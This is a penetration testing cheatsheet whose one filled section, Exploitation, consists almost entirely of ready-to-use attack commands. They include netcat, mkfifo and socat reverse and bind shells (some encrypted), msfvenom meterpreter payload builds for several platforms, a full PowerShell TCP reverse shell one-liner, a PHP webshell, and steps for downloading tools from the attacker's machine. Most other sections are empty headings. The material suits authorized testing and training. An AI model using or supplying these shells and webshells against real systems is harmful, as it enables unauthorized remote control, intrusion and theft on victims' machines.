# 2024 Penetration Testing Cheatsheet

## Table of Contents

**1. [OtherCheatsheets/Libraries](#other-cheatsheetslibraries)**

**2. [General Tools](#2-general-tools)**

**3. [Information Gathering](#3-information-gathering)**

**4. [Vulnerability Scanner](#4-vulnerability-scanner)**

* [Databases](#databases)

**5. [Exploitation](#5-exploitation)**

* [Reverse Shell useful links](#reverse-shells-useful-links)
* [Netcat](#netcat)
* [Socat](#socat)
* [Msfvenom](#msfvenom)
* [Powershell one-liner](#powershell-one-liner)
* [PHP Webshell one-liner](#php-webshell-one-liner)

**6. [Linux Privilege Escalation](#6-linux-privilege-escalation)**

**7. [Windows Privilege Escalation](#7-windows-privilege-escalation)**

**8. [Password/Hash Cracking](#8-passwordhash-cracking)**

* [Hashcat](#hashcat)
* [John the Ripper](#john-the-ripper)
* [Hydra](#hydra)

**9. [Exfiltration](#9-exfiltration)**

* [Server](#server)
* [Upload](#upload)
* [Download](#download)

**10. [Persistence](#10-persistence)**

**11. [Cleanup](#11-cleanup)**


## 1. Other Cheatsheets/Libraries:
[Lolbas-Project](https://lolbas-project.github.io/)

[Ivan-Sincek Penetration testing cheat sheet (very detailed)](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)

[GTFOBins](https://gtfobins.github.io/)

[MITRE ATT&CK](https://attack.mitre.org/)

## 2. General Tools:

[CyberChef](https://gchq.github.io/CyberChef/)

## 3. Information Gathering:

## 4. Vulnerability Scanner:

[Nessus Essential Download](https://community.tenable.com/s/article/Nessus-Essentials?language=en_US)

### Databases:

[Nist](https://community.tenable.com/s/article/Nessus-Essentials?language=en_US)

[CVEdetails](https://www.cvedetails.com/)

[Exploit-DB](https://www.exploit-db.com/)

[Rapid7](https://www.rapid7.com/db/)

## 5. Exploitation:

### Reverse Shells useful links:
https://github.com/martinsohn/PowerShell-reverse-shell

https://www.revshells.com/

https://github.com/samratashok/nishang/tree/master

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Netcat:
Reverse Shell:
```
    A: nc -lnvp <port_number>

    T: nc <local_ip> <port_number> -e /bin/bash
```
Bind Shell:
```
    T: nc -lnvp <port_number> -e "cmd.exe"

    A: nc <local_ip> <port_number>
```
Shell Stabilisation:

    1. Python (sometimes need to specify python version in first cmd)
        python -c 'import pty;pty.spawn("/bin/bash")'
        export TERM=xterm
        Ctrl + Z
        stty raw -echo; fg

    2. Rlwrap
        install rlwrap first on your kali:
        sudo apt install rlwrap

        invoke this listener:
            rlwrap nc -lnvp <port_number>
            CTRL + Z
            stty raw -echo; fg

    3. Socat
        1. Start Webserver on attacker machine(with Socat installed) in the directory of the binary.
            sudo python -m http.server <port>
        2. Use the Netcat reverse shell to download Socat.
            Linux: wget <attack_ip>/socat -o /tmp/socat
            Powershell: Invoke-WebRequest -uri <attack_ip>/socat.exe -outfile C:\\Windows\temp\socat.exe 
        3. Check permissions and execute socat.
    
    General Adjustments:
        open terminal on own machine and use 'stty -a'
        check in the output the values for rows and columns
        use 'stty rows <number>' and 'stty cols <number>' on rev/bind shell

Other things:
```
    Listener: mkfifo /tmp/f; nc -lvnp <port> < /tmp/F | /bin/sh >/tmp/f 2>&1; rm /tmp/f

    Rev-Shell: mkfifo /tmp/f; nc <attack_ip> <port> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f 
```

### Socat:

Reverse Shell (normal):
```
unstable version

    A: socat TCP-L:<port> -

    T-Linux: socat TCP:<attack_ip>:<port_number> EXEC:"bash -li"

    T-Windows: socat TCP:<attack_ip>:<port_number> EXEC:powershell.exe,pipes

stable(only for Linux Target with socat installed/possibly to upload precompiled binary aswell)

    A: socat TCP-L:<port_number> FILE:`tty`,raw,echo=0

    T: socat TCP:<attack_ip>:<port_number> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
Bind Shell (normal):
```
unstable version

    T-Linux: socat TCP-L:<port_number> EXEC:"bash -li"

    T-Windows: socat TCP-L:<port_number> EXEC:powershell.exe;pipes

    A: socat TCP:<target_ip>:<target_port> -
```

Create Certificate:
```
    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
    cat shell.key shell.crt > shell.pem
```
Reverse Shell (encrypted):
```
    A: socat OPENSSL-LISTEN:<port_number>,cert=shell.pem,verify=0 -

    T: socat OPENSSL:<attack_ip>:<port_number>,verify=0 EXEC:/bin/bash
```
Bind Shell (encrypted):
```
Example for Windows

    T: socat OPENSSL-LISTEN:<port_number>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

    A: socat OPENSSL:<target_ip>:<port_number>,verify=0 -
```

### Msfvenom:

use `exploit/multi/handler` to catch rev-shells

Default:
```
    msfvenom -p <PAYLOAD> <OPTIONS>
        -f <format> -> output format
        -o <file> -> output location and filename
        LHOST=<IP>
        LPORT=<port_number>

    payload naming convention: <OS>/<arch>/<payload>

        staged: denoted with forward slah -> shell/reverse_tcp
        stageless: denoted with _  -> shell_reverse_tcp
```
Linux:
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f elf > rev_shell.elf
```

Windows:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f exe > rev_shell.exe
```
PHP:
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f raw > rev_shell.php
```
ASP:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f asp > rev_shell.asp
```
Python:
```
msfvenom -p cmd/unix/reverse_tcp LHOST=<attack_ip> LPORT=<port_number> -f raw > rev_shell.py
```
### Powershell one-liner:
````
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.
GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCI
````
````
powershell -c “$client = New-Object System.Net.Sockets.TCPClient(‘<ip>’,<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘> ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”
````

### PHP Webshell one-liner:
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

need to trigger rev-shell -> find upload folder -> add to url-path `http://<ip>/<path>/php_shell.php?cmd=<rev_shell>`

## 6. Linux Privilege Escalation:

## 7. Windows Privilege Escalation:

## 8. Password/Hash Cracking:

### Hashcat:

### John the Ripper:

### Hydra:

## 9. Exfiltration:

### Server:

### Upload:

### Download:

## 10. Persistence:

## 11. Cleanup: